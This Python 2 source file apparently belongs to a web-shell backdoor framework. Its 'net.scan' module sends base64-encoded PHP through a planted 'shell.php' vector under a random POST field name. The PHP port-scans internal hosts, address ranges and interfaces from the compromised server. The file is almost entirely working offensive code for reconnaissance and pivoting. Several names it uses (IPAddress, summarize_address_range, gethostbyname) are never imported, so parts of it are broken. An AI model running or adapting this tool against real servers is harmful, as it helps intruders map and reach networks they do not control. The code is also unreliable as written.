
from core.module import Module
from core.moduleexception import ModuleException, ProbeException
from core.argparse import ArgumentParser
from external.ipaddr import IPNetwork
import re, os
from core.argparse import SUPPRESS
from core.utils import randstr
from base64 import b64encode

WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_INVALID_SCAN = 'Invalid scan range, check syntax'

class Scan(Module):
    '''Port scan open TCP ports'''
    
    def _set_vectors(self):
        self.support_vectors.add_vector('ifaces', 'net.ifaces', [])
        self.support_vectors.add_vector( 'scan', 'shell.php',["""$str = base64_decode($_POST["$post_field"]);
    foreach (explode(',', $str) as $s) {
    $s2 = explode(' ', $s);
    foreach( explode('|', $s2[1]) as $p) {
    if($fp = fsockopen("$s2[0]", $p, $n, $e, $timeout=1)) {print(" $s2[0]:$p"); fclose($fp);}
    }print(".");}""", "-post", "{\'$post_field\' : \'$data\' }"])
    
    
    def _set_args(self):
        self.argparser.add_argument('addr', help='Single IP, multiple: IP1,IP2,.., networks IP/MASK or firstIP-lastIP, interfaces (ethN)')
        self.argparser.add_argument('port', help='Single post, multiple: PORT1,PORT2,.. or firstPORT-lastPORT')
        self.argparser.add_argument('-unknown', help='Scan also unknown ports', action='store_true')
        self.argparser.add_argument('-ppr', help=SUPPRESS, default=10, type=int)


    def _get_service_path(self):
        return os.path.join(self.modhandler.path_modules, 'net', 'external', 'nmap-services-tcp.txt')
    
    
    
    def _prepare(self):
        
        services_path = self._get_service_path()
        try:
            services = open(services_path, 'r').read()
        except Exception, e:
            raise ProbeException(self.name,  '\'%s\' %s' % (services_path, WARN_NO_SUCH_FILE))

        ifaces_all = self.support_vectors.get('ifaces').execute()

        reqlist = RequestList(self.modhandler, services, ifaces_all)
        reqlist.add(self.args['addr'], self.args['port'])

        if not reqlist:
            raise ProbeException(self.name,  WARN_INVALID_SCAN)
        
        if self.args['ppr'] == 10 and self.args['addr'] == '127.0.0.1':
            self.args['ppr'] = 100
        
        self.args['reqs'] = reqlist

    def _probe(self):
        
        while self.args['reqs']:

            reqstringarray = ''

            requests = self.args['reqs'].get_requests(self.args['ppr'])

            for host, ports in requests.items():
                portschunk = map(str, (ports))
                reqstringarray += '%s %s,' % (host, '|'.join(portschunk))
            
            output = 'SCAN %s:%s-%s ' % (host, portschunk[0], portschunk[-1])
            result = self.support_vectors.get('scan').execute({'post_field' : randstr(), 'data' : b64encode('%s' % reqstringarray[:-1])})
            if result != '.': 
                output += 'OPEN: ' + result.strip()[:-1]
                self._result += result.strip()[:-1]
            
            print output
            
    def _stringify_result(self):
        self._output = ''

class RequestList(dict):


    def __init__(self, modhandler, nmap_file, ifaces):

        self.modhandler = modhandler

        self.port_list = []
        self.ifaces = ifaces

        self.nmap_ports = []
        self.nmap_services = {}

        for line in nmap_file.splitlines():
            name, port = line.split()
            self.nmap_services[int(port)] = name
            self.nmap_ports.append(int(port))

        dict.__init__(self)


    def get_requests(self, howmany):

        to_return = {}
        requests = 0

        # Filling request

        for ip in self:
            while self[ip]:
                if requests >= howmany:
                    break

                if ip not in to_return:
                    to_return[ip] = []

                to_return[ip].append(self[ip].pop(0))

                requests+=1

            if requests >= howmany:
                break


        # Removing empty ips
        for ip, ports in self.items():
            if not ports:
                del self[ip]

        return to_return


    def add(self, net, port):
        """ First add port to duplicate for every inserted host """


        if ',' in port:
            port_ranges = port.split(',')
        else:
            port_ranges = [ port ]

        for ports in port_ranges:
            self.__set_port_ranges(ports)


        # If there are available ports
        if self.port_list:

            if ',' in net:
                addresses = net.split(',')
            else:
                addresses = [ net ]

            for addr in addresses:
                self.__set_networks(addr)

    def __set_port_ranges(self, given_range):

            start_port = None
            end_port = None


            if given_range.count('-') == 1:
                try:
                    splitted_ports = [ int(strport) for strport in given_range.split('-') if (int(strport) > 0 and int(strport) <= 65535)]
                except ValueError:
                    return None
                else:
                    if len(splitted_ports) == 2:
                        start_port = splitted_ports[0]
                        end_port = splitted_ports[1]

            else:
                try:
                    int_port = int(given_range)
                except ValueError:
                    return None
                else:
                    start_port = int_port
                    end_port = int_port

            if start_port and end_port:
                self.port_list += [ p for p in range(start_port, end_port+1) if p in self.nmap_ports]
            else:
                raise ModuleException('net.scan', 'Error parsing port numbers \'%s\'' % given_range)



    def __get_network_from_ifaces(self, iface):

        if iface in self.ifaces.keys():
             return self.ifaces[iface]




    def __set_networks(self, addr):


        networks = []

        try:
            # Parse single IP or networks
            networks.append(IPNetwork(addr))
        except ValueError:

            #Parse IP-IP
            if addr.count('-') == 1:
                splitted_addr = addr.split('-')
                # Only address supported

                try:
                    start_address = IPAddress(splitted_addr[0])
                    end_address = IPAddress(splitted_addr[1])
                except ValueError:
                    pass
                else:
                    networks += summarize_address_range(start_address, end_address)
            else:

                # Parse interface name
                remote_iface = self.__get_network_from_ifaces(addr)
                if remote_iface:
                    networks.append(remote_iface)
                else:
                    # Try to resolve host
                    try:
                        networks.append(IPNetwork(gethostbyname(addr)))
                    except:
                        pass

        if not networks:
            print '[net.scan] Warning: \'%s\' is not an IP address, network or detected interface' % ( addr)

        else:
            for net in networks:
                for ip in net:
                    self[str(ip)] = self.port_list[:]
